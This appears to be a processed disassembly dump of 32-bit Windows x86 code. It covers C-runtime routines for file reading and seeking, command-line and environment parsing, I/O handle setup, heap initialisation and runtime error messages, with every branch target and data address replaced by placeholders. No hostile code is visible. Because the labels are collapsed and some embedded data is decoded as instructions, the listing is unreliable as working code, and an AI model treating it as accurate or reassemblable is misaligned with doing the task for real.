lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40bdc5
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_408f56
push esi
mov edi eax
call sub_40be24
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_408f56
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_406d8b
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_409194
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40912f
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40bdc5
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_409194
push esi
mov edi eax
call sub_40be24
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_409194
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40bd83
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_406dfe
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_406d8b
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_409207
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_40912f
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_406dfe
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_40912f
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_40912f
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_409368
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_408c93
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_4094a6
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_4094a6
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_4094e0
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40c6a5
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40c28b
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_409538
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40c6a5
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_40734d
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_40623d
pop ecx
push esi
call sub_404f30
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_406a86
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_40734d
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_404f30
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_4053c0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_40623d
pop ecx
sub_4095f1
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40c6a5
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40968a
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_40734d
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40968a
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_40623d
pop ecx
sub_40968a
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_40983e
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_40734d
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_40734d
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_405ac0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406a86
pop ecx
mov [ esp + 0x10 ] ebx
sub_409970
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_40734d
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_40623d
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_40734d
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_409b2c
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_409b59
push ebp
mov ebp esp
mov eax 0x122c
call sub_40c960
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_409b2c
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_40bad0
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_40c8e0
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_4052a0
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_40c6c1
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_409ca1
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_409b59
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_40a86f
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_40b3b6
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_409d00
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4057da
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_405798
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4057da
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40586e
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_409de0
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_409e19
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_409e19
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_409e19
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_404f30
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_404f30
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_4053c0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4053c0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_4053d0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4053d0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_4053d0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40c98f
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_404f30
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_405180
add esp 0x10
sub_409f6c
push ebp
mov ebp esp
